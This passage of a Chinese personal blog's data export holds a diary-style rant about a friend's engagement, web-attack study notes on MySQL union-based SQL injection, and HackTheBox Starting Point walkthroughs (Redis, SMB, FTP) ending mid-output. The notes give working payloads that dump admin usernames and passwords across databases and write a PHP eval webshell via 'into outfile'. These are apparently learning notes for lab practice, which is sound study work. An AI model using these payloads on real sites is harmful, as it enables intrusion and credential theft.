/>\n\n和现在真差万别，就昨晚，未婚夫三个字都从她口中说出了。\n\n还记得22年过年和她出去玩她说的是她不结婚，去年有阵子还说之后要从老家出来在外面找工作。\n\n但是，我能有什么办法呢。\n\n我原本以为她是奥丽娜雅法拉奇那样的人，最后还是沦为听话的傀儡，使用自己的子宫、美色、免费劳动力换取金钱和利益。\n\n真真可笑啊，她也不是没有女性思想，道理她都懂。实践起来就和精神分裂的病人一样。\n\n叛逆、觉醒和持续打拳是需要本事的，她没有本事。\n\n实力弱，说再多原生家庭的问题也是找补。\n\n和我一起打拳的高中同桌一语道破真相：\n\n<u>就是她自己说的那段话说给以前的她自己她都会嗤之以鼻的程度</u>\n\n<u>但现在的她就是强行麻木自己，其实也不能百分百说服现在的自己，但她妥协了懒得抗争了这种感觉</u>\n\n<u>可能就是受过伤，但沉溺于受伤，根本就是这个伤不够疼，哪天她体验一下五年三娃婆婆不待见老公不理解那种，身边也没有朋友，自己抑郁到要不行了的时候可能才会激起她的求生欲和反抗欲</u>\n\n是啊。她就是过的太好了。\n\n我只是惋惜我那死去的发小、故人.........\n\n之后我会和她继续渐行渐远，直到再也没话说。\n\n**我会遇见更多和我相似的女性，我可以和她们一起谈天说地，奶茶言欢。**\n\n**我会参与更多惊险刺激的事件，继续我跌宕起伏的日常生活。**\n\n**我会有时间钻研我想学的技术，深耕到不可思议的地步，创建出来新的工具、理论、玩法.....**\n\n**我会和我的母父争吵，也会被母亲背刺，我更会完全不听他们的。**\n\n**我会学好英语去海外留学，尝试一下国外的学生生活究竟是什么样，他们的大学是有多么难毕业。**\n\n**我会去全球旅行，会去练习格斗，会剃寸头，会去学必须的法律知识，会有更广阔的视角，会和更多女性并肩作战。**\n\n**以我为中心播撒的种子和涟漪会影响到周围更多女性，我们其实从不孤单。**\n\n","tags":["隐藏内容"],"categories":["碎碎念"]},{"title":"web攻防笔记第42天","url":"/2023/07/05/web攻防笔记第42天/","content":"\n### Ⅰ 数据库管理方式\n\nmysql里面有内置的管理用户，其中root就是默认数据库管理员用户，网站上面的数据库都在mysql中，由root或一对一用户去管理。\n\n1、数据库root（自带默认）统一管理\n\n每个网站的数据库都由root用户统一管理。\n\n```\nmysql\n\troot（自带默认）\n\t\t网站A testA \n\t\t网站B testB\n```\n\n\n\n2、数据库一对一管理（不同用户）【推荐】\n\n自己的网站单独创建数据库用户去管理自己的数据库\n\n```\nmysql\n\t数据库名A\n\t\t表名\n\t\t\t列名（字段）\n\t\t\t\t数据\n\t数据库名B\n\t\t表名\n\t\t\t列名（字段）\n\t\t\t\t数据\n\t\t\t\t\nAssess（单个）\n\t表名\n\t\t列名（字段）\n\t\t\t数据\n```\n\n目的：获取数据\n\n肯定可以一步步得到信息\n\n\n\n### Ⅱ SQL注入\n\n#### MYSQL注入思路：（目的获取当前web权限）\n\n1、判断常见四个信息（系统，用户，数据库名，版本）\n\n2、根据四个信息去选择方案\n\nroot用户：先测试读写，后测试获取数据\n\n非root用户：直接测试获取数据\n\n\n\n#### 2.1ACCESS SQLMAP\n\naccess sqlmap爆破依赖字典，不一定能猜到表名列名。\n\n\n\n#### 2.2 SQL注入原理\n\n接受的参数值未进行过滤直接带入SQL查询的操作，就是SQL注入产生的原理。\n\n攻击：利用SQL语句执行你想要的东西（SQL语句能干嘛，注入就能干嘛）\n\nSQL语句能干嘛 = SQL语句由谁决定 => 数据库类型决定 (为什么mysql注入 oracle注入叫法原因)\n\n\n\n#### 2.3 `PHP-MYSQL-SQL`常规查询\n\n1、数据库版本-看是否符合information_schema查询-version()：**mysql5.0以上**\n\n2、数据库用户-看是否符合ROOT型注入攻击-user()：**是否可跨库查询**\n\n3、当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os\n\n4、数据库名字-为后期猜解指定数据库下的表，列做准备-database()\n\n\n\n##### 2.2.1 `information_schema`\n\n`MYSQL5.0`以上版本：自带的数据库名`information_schema`\n\n`information_schema`：存储数据库下的数据库名及表名，列名信息的数据库\n\n`information_schema.schemata`：记录数据库名信息的表\n\n`information_schema.tables`：记录表名信息的表\n\n`information_schema.columns`：记录列名信息表\n\n`schema_name：information_schema.schemata`记录数据库名信息的列名值\n\n`table_schema：information_schema.tables`记录数据库名的列名值\n\n`table_name：information_schema.tables`记录表名的列名值\n\n`column_name：information_schema.columns`记录列名的列名值\n\n\n\n##### 2.2.2 `MYSQL`注入查询含义 - 依赖`information_schema`\n\n1、order by {阿拉伯数字} ：查询一共有几列列名；\n\n2、union select 1,2,3,4,5,6 ：看页面回显的数字，可以将其替换成所需目标信息（版本号、数据库名、操作系统等等）；\n\n3、`verson()`、`database()`、`user()`、`@@version_complie_os`；\n\n4、`group_concat()` ：拼接字符串。**将group by产生的同一个分组中的值连接起来，返回一个字符串结果。**\n\n4.1、`group_concat()`语法：**group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator '分隔符'] )**   中括号可选\n\n4.2、MySQL中concat()、concat_ws()、group_concat()函数使用技巧与心得：https://zhuanlan.zhihu.com/p/257399676\n\n5、`from information_schema.tables where table_schema='demo01'` 固定数据库名(前面查到的`datebase()`)；\n\n6、`from information_schema.columns where table_name='admin'` 固定表名（5步骤查到了）\n\n7、limit：\n\n```sql\norder by 6 \nunion select 1,2,3,4,5,6\nunion select 1,2,3,database(),user(),6\nunion select 1,2,3,version(),@@version_compile_os,6\n    \n#5查询数据库名demo01下的表名信息（借助information_schema.tables存储查询）\nunion select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema='demo01'\n\n#6查询数据库名demo01下的表名admin的列名信息（借助information_schema.columns存储查询）\nunion select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_schema='demo01' and table_name='admin'\n\n#7知道表名列名可以一步到位查询\nunion select 1,2,3,username,password,6 from admin limit 0,1\n\n```\n\n\n\n#### 2.4 `PHP-MYSQL-SQL`跨库查询（第一种数据库管理方式root导致）\n\n##### 2.4.1 跨库查询概念\n\n含义：通过B网站的注入点获取A网站的账号密码\n\n影响**条件：当前数据库ROOT用户权限**\n\n测试不同数据库用户：root demo\n\n\n\n##### 2.4.2跨库示例\n\n```sql\n#获取mysql下所有数据库名：\nhttp://IP/new.php?id=1 union select 1,2,3,group_concat(schema_name),5,6 from information_schema.schemata\n#获取zblog数据库中的表名：\nhttp://IP/new.php?id=1 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema='zblog'\n#获取zbp_member表中的列名：\nhttp://IP/new.php?id=1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_schema='zblog' and table_name='zbp_member'\n\nunion select 1,2,3,mem_Name,mem_Password,6 from zblog.zbp_member\n```\n\n解决：单引号过滤绕过方式\n\n**SQL注入语句中用单引号就不要编码，编码就不用单引号（路径，表名，数据库名等）**\n\n\n\n#### 2.5文件读写（已少见）\n\n##### 影响条件\n\n1、当前数据库用户权限：测试不同数据库用户（root demo）\n\n2、`secure-file-priv`设置路径限定，则无法文件读写上传后门\n\n\n\n##### 示例\n\n```mysql\n#可单引号中加后门上传<?php eval($_POST[x]);?>\nunion select 1,load_file('d:\\\\1.txt'),3,4,5,6\n#outfile后的读写路径还需寻找\nunion select 1,'xiaodi',3,4,5,6 into outfile 'd:\\\\2.txt'\n```\n\n注：文件路径也可用编码上传\n\n\n\n##### 读写的路径的问题\n\n1、报错显示获取路径\n\n2、phpinfo页面泄漏\n\n如果不知道路径，思路：\n\n利用常见的默认的中间件，数据库等安装路径读取有价值信息\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["笔记","xiaodi8","web攻防"],"categories":["学习"]},{"title":"HTB-Redeemer","url":"/2023/07/03/HTB-Redeemer/","content":"\n\n\n```bash\nubuntu@ip:~$ nmap -p- -sV 10.129.68.30\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 13:59 UTC\nNmap scan report for ip-10-129-68-30.us-west-1.compute.internal (10.129.68.30)\nHost is up (0.076s latency).\nNot shown: 65534 closed tcp ports (conn-refused)\nPORT     STATE SERVICE VERSION\n6379/tcp open  redis   Redis key-value store 5.0.7\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 34.55 seconds\n\nubuntu@ip:~$ sudo apt install redis-tools\nReading package lists... Done\nBuilding dependency tree... Done\nReading state information... Done\nThe following additional packages will be installed:\n  libatomic1 libjemalloc2 liblua5.1-0 liblzf1 lua-bitop lua-cjson\nSuggested packages:\n  ruby-redis\nE: Could not get lock /var/cache/apt/archives/lock. It is held by process 23850 (apt-get)\nN: Be aware that removing the lock file is not a solution and may break your system.\nE: Unable to lock directory /var/cache/apt/archives/\nubuntu@ip-172-31-17-119:~$ sudo apt install redis-tools\nReading package lists... Done\nBuilding dependency tree... Done\nReading state information... Done\nThe following additional packages will be installed:\n  libatomic1 libjemalloc2 liblua5.1-0 liblzf1 lua-bitop lua-cjson\nSuggested packages:\n  ruby-redis\nE: Could not get lock /var/cache/apt/archives/lock. It is held by process 23850 (apt-get)\nN: Be aware that removing the lock file is not a solution and may break your system.\nE: Unable to lock directory /var/cache/apt/archives/\n\nubuntu@ip:~$ sudo rm -rf /var/cache/apt/archives/lock\n\nubuntu@ip:~$ sudo apt-get update\nHit:1 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy InRelease\nGet:2 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy-updates InRelease [119 kB]\nGet:3 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy-backports InRelease [108 kB]\nGet:4 http://security.ubuntu.com/ubuntu jammy-security InRelease [110 kB]               \nFetched 337 kB in 1s (426 kB/s)    \nReading package lists... Done\n\nubuntu@ip:~$ sudo apt install redis-tools\nReading package lists... Done\nBuilding dependency tree... Done\nReading state information... Done\nThe following additional packages will be installed:\n  libatomic1 libjemalloc2 liblua5.1-0 liblzf1 lua-bitop lua-cjson\nSuggested packages:\n  ruby-redis\nThe following NEW packages will be installed:\n  libatomic1 libjemalloc2 liblua5.1-0 liblzf1 lua-bitop lua-cjson redis-tools\n0 upgraded, 7 newly installed, 0 to remove and 24 not upgraded.\nNeed to get 1237 kB of archives.\nAfter this operation, 5576 kB of additional disk space will be used.\nDo you want to continue? [Y/n] y\nGet:1 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy-updates/main amd64 libatomic1 amd64 12.1.0-2ubuntu1~22.04 [10.4 kB]\nGet:2 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy/universe amd64 libjemalloc2 amd64 5.2.1-4ubuntu1 [240 kB]\nGet:3 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy/universe amd64 liblua5.1-0 amd64 5.1.5-8.1build4 [99.9 kB]\nGet:4 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy/universe amd64 liblzf1 amd64 3.6-3 [7444 B]\nGet:5 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy/universe amd64 lua-bitop amd64 1.0.2-5 [6680 B]\nGet:6 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy/universe amd64 lua-cjson amd64 2.1.0+dfsg-2.1 [17.4 kB]\nGet:7 http://us-west-1.ec2.archive.ubuntu.com/ubuntu jammy/universe amd64 redis-tools amd64 5:6.0.16-1ubuntu1 [856 kB]\nFetched 1237 kB in 0s (2631 kB/s)\ndebconf: DbDriver \"config\": /var/cache/debconf/config.dat is locked by another process: Resource temporarily unavailable\nSelecting previously unselected package libatomic1:amd64.\n(Reading database ... 94767 files and directories currently installed.)\nPreparing to unpack .../0-libatomic1_12.1.0-2ubuntu1~22.04_amd64.deb ...\nUnpacking libatomic1:amd64 (12.1.0-2ubuntu1~22.04) ...\nSelecting previously unselected package libjemalloc2:amd64.\nPreparing to unpack .../1-libjemalloc2_5.2.1-4ubuntu1_amd64.deb ...\nUnpacking libjemalloc2:amd64 (5.2.1-4ubuntu1) ...\nSelecting previously unselected package liblua5.1-0:amd64.\nPreparing to unpack .../2-liblua5.1-0_5.1.5-8.1build4_amd64.deb ...\nUnpacking liblua5.1-0:amd64 (5.1.5-8.1build4) ...\nSelecting previously unselected package liblzf1:amd64.\nPreparing to unpack .../3-liblzf1_3.6-3_amd64.deb ...\nUnpacking liblzf1:amd64 (3.6-3) ...\nSelecting previously unselected package lua-bitop:amd64.\nPreparing to unpack .../4-lua-bitop_1.0.2-5_amd64.deb ...\nUnpacking lua-bitop:amd64 (1.0.2-5) ...\nSelecting previously unselected package lua-cjson:amd64.\nPreparing to unpack .../5-lua-cjson_2.1.0+dfsg-2.1_amd64.deb ...\nUnpacking lua-cjson:amd64 (2.1.0+dfsg-2.1) ...\nSelecting previously unselected package redis-tools.\nPreparing to unpack .../6-redis-tools_5%3a6.0.16-1ubuntu1_amd64.deb ...\nUnpacking redis-tools (5:6.0.16-1ubuntu1) ...\nSetting up libjemalloc2:amd64 (5.2.1-4ubuntu1) ...\nSetting up lua-cjson:amd64 (2.1.0+dfsg-2.1) ...\nSetting up liblzf1:amd64 (3.6-3) ...\nSetting up libatomic1:amd64 (12.1.0-2ubuntu1~22.04) ...\nSetting up lua-bitop:amd64 (1.0.2-5) ...\nSetting up liblua5.1-0:amd64 (5.1.5-8.1build4) ...\nSetting up redis-tools (5:6.0.16-1ubuntu1) ...\nProcessing triggers for man-db (2.10.2-1) ...\nProcessing triggers for libc-bin (2.35-0ubuntu3.1) ...\ndebconf: DbDriver \"config\": /var/cache/debconf/config.dat is locked by another process: Resource temporarily unavailable\n\nubuntu@ip:~$ redis-cli --help\nredis-cli 6.0.16\n\nUsage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]\n  -h <hostname>      Server hostname (default: 127.0.0.1).\n  -p <port>          Server port (default: 6379).\n  -s <socket>        Server socket (overrides hostname and port).\n  -a <password>      Password to use when connecting to the server.\n                     You can also use the REDISCLI_AUTH environment\n                     variable to pass this password more safely\n                     (if both are used, this argument takes precedence).\n  --user <username>  Used to send ACL style 'AUTH username pass'. Needs -a.\n  --pass <password>  Alias of -a for consistency with the new --user option.\n  --askpass          Force user to input password with mask from STDIN.\n                     If this argument is used, '-a' and REDISCLI_AUTH\n                     environment variable will be ignored.\n  -u <uri>           Server URI.\n  -r <repeat>        Execute specified command N times.\n  -i <interval>      When -r is used, waits <interval> seconds per command.\n                     It is possible to specify sub-second times like -i 0.1.\n  -n <db>            Database number.\n  -3                 Start session in RESP3 protocol mode.\n  -x                 Read last argument from STDIN.\n  -d <delimiter>     Delimiter between response bulks for raw formatting (default: \\n).\n  -D <delimiter>     Delimiter between responses for raw formatting (default: \\n).\n  -c                 Enable cluster mode (follow -ASK and -MOVED redirections).\n  --tls              Establish a secure TLS connection.\n  --sni <host>       Server name indication for TLS.\n  --cacert <file>    CA Certificate file to verify with.\n  --cacertdir <dir>  Directory where trusted CA certificates are stored.\n                     If neither cacert nor cacertdir are specified, the default\n                     system-wide trusted root certs configuration will apply.\n  --cert <file>      Client certificate to authenticate with.\n  --key <file>       Private key file to authenticate with.\n  --raw              Use raw formatting for replies (default when STDOUT is\n                     not a tty).\n  --no-raw           Force formatted output even when STDOUT is not a tty.\n  --csv              Output in CSV format.\n  --stat             Print rolling stats about server: mem, clients, ...\n  --latency          Enter a special mode continuously sampling latency.\n                     If you use this mode in an interactive session it runs\n                     forever displaying real-time stats. Otherwise if --raw or\n                     --csv is specified, or if you redirect the output to a non\n                     TTY, it samples the latency for 1 second (you can use\n                     -i to change the interval), then produces a single output\n                     and exits.\n  --latency-history  Like --latency but tracking latency changes over time.\n                     Default time interval is 15 sec. Change it using -i.\n  --latency-dist     Shows latency as a spectrum, requires xterm 256 colors.\n                     Default time interval is 1 sec. Change it using -i.\n  --lru-test <keys>  Simulate a cache workload with an 80-20 distribution.\n  --replica          Simulate a replica showing commands received from the master.\n  --rdb <filename>   Transfer an RDB dump from remote server to local file.\n  --pipe             Transfer raw Redis protocol from stdin to server.\n  --pipe-timeout <n> In --pipe mode, abort with error if after sending all data.\n                     no reply is received within <n> seconds.\n                     Default timeout: 30. Use 0 to wait forever.\n  --bigkeys          Sample Redis keys looking for keys with many elements (complexity).\n  --memkeys          Sample Redis keys looking for keys consuming a lot of memory.\n  --memkeys-samples <n> Sample Redis keys looking for keys consuming a lot of memory.\n                     And define number of key elements to sample\n  --hotkeys          Sample Redis keys looking for hot keys.\n                     only works when maxmemory-policy is *lfu.\n  --scan             List all keys using the SCAN command.\n  --pattern <pat>    Keys pattern when using the --scan, --bigkeys or --hotkeys\n                     options (default: *).\n  --intrinsic-latency <sec> Run a test to measure intrinsic system latency.\n                     The test will run for the specified amount of seconds.\n  --eval <file>      Send an EVAL command using the Lua script at <file>.\n  --ldb              Used with --eval enable the Redis Lua debugger.\n  --ldb-sync-mode    Like --ldb but uses the synchronous Lua debugger, in\n                     this mode the server is blocked and script changes are\n                     not rolled back from the server memory.\n  --cluster <command> [args...] [opts...]\n                     Cluster Manager command and arguments (see below).\n  --verbose          Verbose mode.\n  --no-auth-warning  Don't show warning message when using password on command\n                     line interface.\n  --help             Output this help and exit.\n  --version          Output version and exit.\n\nCluster Manager Commands:\n  Use --cluster help to list all available cluster manager commands.\n\nExamples:\n  cat /etc/passwd | redis-cli -x set mypasswd\n  redis-cli get mypasswd\n  redis-cli -r 100 lpush mylist x\n  redis-cli -r 100 -i 1 info | grep used_memory_human:\n  redis-cli --eval myscript.lua key1 key2 , arg1 arg2 arg3\n  redis-cli --scan --pattern '*:12345*'\n\n  (Note: when using --eval the comma separates KEYS[] from ARGV[] items)\n\nWhen no command is given, redis-cli starts in interactive mode.\nType \"help\" in interactive mode for information on available commands\nand settings.\n\nubuntu@ip:~$ redis-cli -h 10.129.68.30\n\n10.129.68.30:6379> info\n# Server\nredis_version:5.0.7\nredis_git_sha1:00000000\nredis_git_dirty:0\nredis_build_id:66bd629f924ac924\nredis_mode:standalone\nos:Linux 5.4.0-77-generic x86_64\narch_bits:64\nmultiplexing_api:epoll\natomicvar_api:atomic-builtin\ngcc_version:9.3.0\nprocess_id:750\nrun_id:d3dd8b76d2419d950a3274b7385776b2e4c4c80d\ntcp_port:6379\nuptime_in_seconds:3019\nuptime_in_days:0\nhz:10\nconfigured_hz:10\nlru_clock:10499320\nexecutable:/usr/bin/redis-server\nconfig_file:/etc/redis/redis.conf\n\n# Clients\nconnected_clients:1\nclient_recent_max_input_buffer:2\nclient_recent_max_output_buffer:0\nblocked_clients:0\n\n# Memory\nused_memory:859624\nused_memory_human:839.48K\nused_memory_rss:6004736\nused_memory_rss_human:5.73M\nused_memory_peak:859624\nused_memory_peak_human:839.48K\nused_memory_peak_perc:100.00%\nused_memory_overhead:846142\nused_memory_startup:796224\nused_memory_dataset:13482\nused_memory_dataset_perc:21.26%\nallocator_allocated:1564792\nallocator_active:1937408\nallocator_resident:9158656\ntotal_system_memory:2084024320\ntotal_system_memory_human:1.94G\nused_memory_lua:41984\nused_memory_lua_human:41.00K\nused_memory_scripts:0\nused_memory_scripts_human:0B\nnumber_of_cached_scripts:0\nmaxmemory:0\nmaxmemory_human:0B\nmaxmemory_policy:noeviction\nallocator_frag_ratio:1.24\nallocator_frag_bytes:372616\nallocator_rss_ratio:4.73\nallocator_rss_bytes:7221248\nrss_overhead_ratio:0.66\nrss_overhead_bytes:-3153920\nmem_fragmentation_ratio:7.34\nmem_fragmentation_bytes:5187120\nmem_not_counted_for_evict:0\nmem_replication_backlog:0\nmem_clients_slaves:0\nmem_clients_normal:49694\nmem_aof_buffer:0\nmem_allocator:jemalloc-5.2.1\nactive_defrag_running:0\nlazyfree_pending_objects:0\n\n# Persistence\nloading:0\nrdb_changes_since_last_save:0\nrdb_bgsave_in_progress:0\nrdb_last_save_time:1688218802\nrdb_last_bgsave_status:ok\nrdb_last_bgsave_time_sec:0\nrdb_current_bgsave_time_sec:-1\nrdb_last_cow_size:409600\naof_enabled:0\naof_rewrite_in_progress:0\naof_rewrite_scheduled:0\naof_last_rewrite_time_sec:-1\naof_current_rewrite_time_sec:-1\naof_last_bgrewrite_status:ok\naof_last_write_status:ok\naof_last_cow_size:0\n\n# Stats\ntotal_connections_received:7\ntotal_commands_processed:6\ninstantaneous_ops_per_sec:0\ntotal_net_input_bytes:293\ntotal_net_output_bytes:14786\ninstantaneous_input_kbps:0.00\ninstantaneous_output_kbps:0.00\nrejected_connections:0\nsync_full:0\nsync_partial_ok:0\nsync_partial_err:0\nexpired_keys:0\nexpired_stale_perc:0.00\nexpired_time_cap_reached_count:0\nevicted_keys:0\nkeyspace_hits:0\nkeyspace_misses:0\npubsub_channels:0\npubsub_patterns:0\nlatest_fork_usec:693\nmigrate_cached_sockets:0\nslave_expires_tracked_keys:0\nactive_defrag_hits:0\nactive_defrag_misses:0\nactive_defrag_key_hits:0\nactive_defrag_key_misses:0\n\n# Replication\nrole:master\nconnected_slaves:0\nmaster_replid:f95485220a58f8f0162a074f22fd55906dfdd0fe\nmaster_replid2:0000000000000000000000000000000000000000\nmaster_repl_offset:0\nsecond_repl_offset:-1\nrepl_backlog_active:0\nrepl_backlog_size:1048576\nrepl_backlog_first_byte_offset:0\nrepl_backlog_histlen:0\n\n# CPU\nused_cpu_sys:2.878009\nused_cpu_user:3.157382\nused_cpu_sys_children:0.002176\nused_cpu_user_children:0.000000\n\n# Cluster\ncluster_enabled:0\n\n# Keyspace\ndb0:keys=4,expires=0,avg_ttl=0\n\n10.129.68.30:6379> select 0\nOK\n\n10.129.68.30:6379> key *\n(error) ERR unknown command `key`, with args beginning with: `*`, \n\n10.129.68.30:6379> keys *\n1) \"temp\"\n2) \"numb\"\n3) \"flag\"\n4) \"stor\"\n\n10.129.68.30:6379> get temp\n\"1c98492cd337252698d0c5f631dfb7ae\"\n\n10.129.68.30:6379> get flag\n\"03e1d2b376c37ab3f5319922053953eb\"\n```\n\n做不动英语阅读了..........\n\n![0级免费做完啦](../image/Redeemer.png)\n","tags":["HTB","笔记","STARTING POINT"],"categories":["学习"]},{"title":"HTB-Dancing","url":"/2023/07/03/HTB-Dancing/","content":"\nSMB = Server Message Block\n\n```bash\nubuntu@ip:~$ nmap -sV 10.129.166.135\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 10:00 UTC\nNmap scan report for ip-10-129-166-135.us-west-1.compute.internal (10.129.166.135)\nHost is up (0.076s latency).\nNot shown: 997 closed tcp ports (conn-refused)\nPORT    STATE SERVICE       VERSION\n135/tcp open  msrpc         Microsoft Windows RPC\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds?\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.26 seconds\n\nubuntu@ip:~$ smbclient -L 10.129.166.135\nPassword for [WORKGROUP\\ubuntu]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        WorkShares      Disk      \nSMB1 disabled -- no workgroup available\n\nubuntu@ip:~$ smbclient \\\\\\\\10.129.166.135\\\\WorkShares\nPassword for [WORKGROUP\\ubuntu]:\nTry \"help\" to get a list of possible commands.\nsmb: \\> help\n?              allinfo        altname        archive        backup         \nblocksize      cancel         case_sensitive cd             chmod          \nchown          close          del            deltree        dir            \ndu             echo           exit           get            getfacl        \ngeteas         hardlink       help           history        iosize         \nlcd            link           lock           lowercase      ls             \nl              mask           md             mget           mkdir          \nmore           mput           newer          notify         open           \nposix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    \nposix_unlink   posix_whoami   print          prompt         put            \npwd            q              queue          quit           readlink       \nrd             recurse        reget          rename         reput          \nrm             rmdir          showacls       setea          setmode        \nscopy          stat           symlink        tar            tarmode        \ntimeout        translate      unlock         volume         vuid           \nwdel           logon          listconnect    showconnect    tcon           \ntdis           tid            utimes         logoff         ..             \n!              \n\nsmb: \\> ls\n  .                                   D        0  Mon Mar 29 08:22:01 2021\n  ..                                  D        0  Mon Mar 29 08:22:01 2021\n  Amy.J                               D        0  Mon Mar 29 09:08:24 2021\n  James.P                             D        0  Thu Jun  3 08:38:03 2021\n\n                5114111 blocks of size 4096. 1752067 blocks available\n\nsmb: \\> cd Amy.J\\\nsmb: \\Amy.J\\> ls\n  .                                   D        0  Mon Mar 29 09:08:24 2021\n  ..                                  D        0  Mon Mar 29 09:08:24 2021\n  worknotes.txt                       A       94  Fri Mar 26 11:00:37 2021\n\n                5114111 blocks of size 4096. 1752067 blocks available\n\nsmb: \\Amy.J\\> get worknotes.txt \ngetting file \\Amy.J\\worknotes.txt of size 94 as worknotes.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)\n\nsmb: \\Amy.J\\> cd ..\n\nsmb: \\> ls\n  .                                   D        0  Mon Mar 29 08:22:01 2021\n  ..                                  D        0  Mon Mar 29 08:22:01 2021\n  Amy.J                               D        0  Mon Mar 29 09:08:24 2021\n  James.P                             D        0  Thu Jun  3 08:38:03 2021\n\n                5114111 blocks of size 4096. 1752067 blocks available\n\nsmb: \\> cd James.P\\\n\nsmb: \\James.P\\> ls\n  .                                   D        0  Thu Jun  3 08:38:03 2021\n  ..                                  D        0  Thu Jun  3 08:38:03 2021\n  flag.txt                            A       32  Mon Mar 29 09:26:57 2021\n\n                5114111 blocks of size 4096. 1752051 blocks available\n\nsmb: \\James.P\\> get flag.txt \ngetting file \\James.P\\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)\n\nsmb: \\James.P\\> exit\n\nubuntu@ip:~$ ls\nflag.txt  lab_KILLMEN.ovpn  lab_KILLMEN1.ovpn  snap  starting_point_KILLMEN.ovpn  worknotes.txt\n\nubuntu@ip:~$ cat worknotes.txt \n- start apache server on the linux machine\n- secure the ftp server\n- setup winrm on dancing ubuntu@ip-172-31-17-119:~$ \n\nubuntu@ip:~$ cat flag.txt \n5f61c10dffbc77a704d76016a22f1664\n```\n\n![第三关Pwned！](../image/Dancing.png)\n\n| One of these   | 其中一个；其中之一                                           |\n| -------------- | ------------------------------------------------------------ |\n| serial ports   | 串行端口                                                     |\n| reserved for   | 保留给                                                       |\n| authentication | n. 认证；鉴定；身份验证                                      |\n| Hypothetically | 假设；假设地；假定地；假想                                   |\n| alongside      | prep. 与…一起；在…旁边；与…同时；沿着 adv. 在…旁边；与…并排；在…的侧面 |\n| tactic         | n. 战术；策略；手段；兵法；招数 adj. 排列的，顺序的；<化>有规立构的；<生>（有）趋性的 |\n| prone          | adj. 俯卧的；易于遭受…的；易于遭受；有做…倾向的；有做(坏事)的倾向 |\n| directories    | n. (计算机文件或程序的)目录；名录；电话号码簿；公司名录      |\n","tags":["HTB","笔记","STARTING POINT"],"categories":["学习"]},{"title":"HTB-Fawn","url":"/2023/07/03/HTB-Fawn/","content":"\nFTP  =   File Transfer Protocol  >  21 port\n\n```bash\nubuntu@ip:~$ ping 10.129.24.17\nPING 10.129.24.17 (10.129.24.17) 56(84) bytes of data.\n64 bytes from 10.129.24.17: icmp_seq=1 ttl=63 time=75.7 ms\n64 bytes from 10.129.24.17: icmp_seq=2 ttl=63 time=75.7 ms\n64 bytes from 10.129.24.17: icmp_seq=3 ttl=63 time=75.6 ms\n64 bytes from 10.129.24.17: icmp_seq=4 ttl=63 time=75.7 ms\n^C\n--- 10.129.24.17 ping statistics ---\n16 packets transmitted, 16 received, 0% packet loss, time 15025ms\nrtt min/avg/max/mdev = 75.492/75.685/75.995/0.129 ms\nubuntu@ip-172-31-17-119:~$ sudo nmap 10.129.24.17\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 06:16 UTC\nCouldn`t open a raw socket. Error: Permission denied (13)\n\nubuntu@ip:~$ nmap 10.129.24.17\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 06:17 UTC\nNmap scan report for ip-10-129-24-17.us-west-1.compute.internal (10.129.24.17)\nHost is up (0.076s latency).\nNot shown: 999 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n21/tcp open  ftp\n\nNmap done: 1 IP address (1 host up) scanned in 1.32 seconds\n\nubuntu@ip:~$ nmap -sV 10.129.24.17\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 06:24 UTC\nNmap scan report for ip-10-129-24-17.us-west-1.compute.internal (10.129.24.17)\nHost is up (0.075s latency).\nNot shown: 999 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\nService Info: OS: Unix\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 1.87 seconds\n\nubuntu@ip:~$ apt install ftp -y\nE: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)\nE: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you root?\nubuntu@ip-172-31-17-119:~$ ftp --h\nftp: invalid option -- '-'\nusage: ftp [-46AadefginpRtVv] [-N NETRC] [-o OUTPUT] [-P PORT] [-q QUITTIME]\n           [-r RETRY] [-s SRCADDR] [-T DIR,MAX[,INC]] [-x XFERSIZE]\n           [[USER@]HOST [PORT]]\n           [[USER@]HOST:[PATH][/]]\n           [file:///PATH]\n           [ftp://[USER[:PASSWORD]@]HOST[:PORT]/PATH[/][;type=TYPE]]\n           [http://[USER[:PASSWORD]@]HOST[:PORT]/PATH]\n           [https://[USER[:PASSWORD]@]HOST[:PORT]/PATH]\n           ...\n       ftp -u URL FILE ...\n       ftp 